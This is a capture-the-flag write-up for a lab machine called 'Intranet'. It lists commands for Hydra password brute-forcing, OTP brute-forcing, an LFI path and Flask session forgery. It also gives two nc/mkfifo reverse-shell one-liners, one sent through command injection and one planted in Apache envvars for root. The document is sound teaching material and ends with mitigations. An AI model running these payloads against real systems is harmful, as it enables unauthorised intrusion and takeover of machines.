# Intranet

**Difficulty:** Medium
**Category:** Web / Authentication / LFI / Privilege Escalation

## Summary

The machine was compromised through weak authentication, OTP brute-forcing, LFI, Flask session forgery, command injection, and an Apache privilege-escalation misconfiguration.

## Attack Chain

`Password Wordlist → Hydra → OTP Brute Force → LFI → Flask Session Forgery → Command Injection → Moving Lateral → SSH → Sudo Apache Restart → Root`

---

## Flag 1 — Web Authentication

The application exposed a login page. Based on the information gathered from the application, a small username-based password wordlist was created.

### `names.txt`

```text
anders
devops
securesolacoders
senior
developer
```

### `users.txt`

```text
anders@securesolacoders.no
devops@securesolacoders.no
```

A custom John the Ripper rule was used to generate password variations:

```text
[List.Rules:TryHackMe]
Az"[0-9]"
Az"[0-9][0-9]"
Az"[0-9][0-9][0-9]"
Az"[0-9][0-9][0-9][0-9]"
Az"[0-9]" $[!$§$%/()=?*@]
```

The password wordlist was generated with:

```bash
john -wordlist:names.txt -rules:TryHackMe -stdout > passwords.txt
```

The generated passwords were then tested against the login form:

```bash
hydra -L users.txt -P passwords.txt securesolacoders.no -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:Error"
```

Valid credentials were obtained for:

```text
Username: ******@securesolacoders.no
Password: ********************
```

---

## Flag 2 — SMS Code Bypass

After authentication, the application required a 4-digit SMS verification code.

A Python script was used to automatically test the possible values from `0000` to `9999`.

The valid SMS code provided access to the next stage.

---

## Flag 3 — Local File Inclusion

The `news` parameter was vulnerable to Local File Inclusion.

The Flask application's source code was retrieved using:

```text
news=../../home/devops/app.py
```

Reading `app.py` revealed the application's session implementation and helped identify the Flask secret-key mechanism.

---

## Flag 4 — Flask Session Forgery

The application used Flask's signed session cookies.

First, the captured session cookie was decoded to inspect its contents:

```bash
flask-unsign --decode --cookie 'PASTE_YOUR_SESSION_COOKIE_HERE'
```

This revealed the session structure, including values such as:

```text
logged_in
username
```

Since Flask signs the session using a secret key, possible secret keys were generated:

```bash
for i in $(seq 100000 999999); do echo "secret_key_$i"; done > wordlist.txt
```

The secret key was then recovered using:

```bash
flask-unsign --unsign --cookie 'PASTE_YOUR_SESSION_COOKIE_HERE' --wordlist wordlist.txt
```

After obtaining the secret, an admin session was forged:

```bash
flask-unsign --sign --cookie '{"logged_in": true, "username": "admin"}' --secret 'YOUR_SECRET'
```

The forged cookie was then supplied to the `/admin` endpoint.

---

## Flag 5 — Command Injection

The `/admin` endpoint contained a debug functionality vulnerable to command injection.

Using the forged admin session, the following request was used to execute a reverse shell:

```bash
curl 'http://10.49.170.207:8080/admin' -X POST -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.aoQbVA.W3gKYvB0vpVeRjsdmldzPf6CciA' --data-raw 'debug=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.49.124.227 4444 >/tmp/f'
```

Listener:

```bash
nc -lvnp 4444
```

The reverse shell connected back successfully.

---

## Flag 6 — Moving Lateral

Process enumeration showed that the Apache process was running as the user `anders`.

The web root was writable, so a PHP reverse shell was placed in:

```text
/var/www/html/revshell.php
```

After triggering the PHP file through the web server, a shell was received as `anders`.

This provided access to the user flag.

---

## SSH 

To establish SSH access, an Ed25519 key pair was generated:

```bash
ssh-keygen -t ed25519
```

The public key was added to the existing SSH configuration:

```bash
nano ~/.ssh/authorized_keys
```

SSH access was then established with:

```bash
ssh -i ~/.ssh/id_ed25519 username@TARGET_IP
```

---

## Flag 7 — Privilege Escalation

After obtaining access as `anders`, sudo permissions were checked:

```bash
sudo -l
```

The following permission was available:

```text
NOPASSWD: /sbin/service apache2 restart
```

The Apache `envvars` configuration was writable. This allowed a reverse-shell command to be placed in the configuration and executed when Apache was restarted.

The reverse-shell payload used was:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.49.124.227 9999 >/tmp/f
```

Listener:

```bash
nc -lvnp 9999
```

Apache was then restarted using the permitted sudo command:

```bash
sudo /sbin/service apache2 restart
```

The reverse shell connected back with root privileges, providing access to the final flag.

---

## Mitigation

* Enforce strong passwords and rate-limit login and OTP attempts.
* Prevent LFI using strict file-path validation and allowlists.
* Use a cryptographically random Flask secret key and secure session configuration.
* Never execute user-controlled input through shell commands.
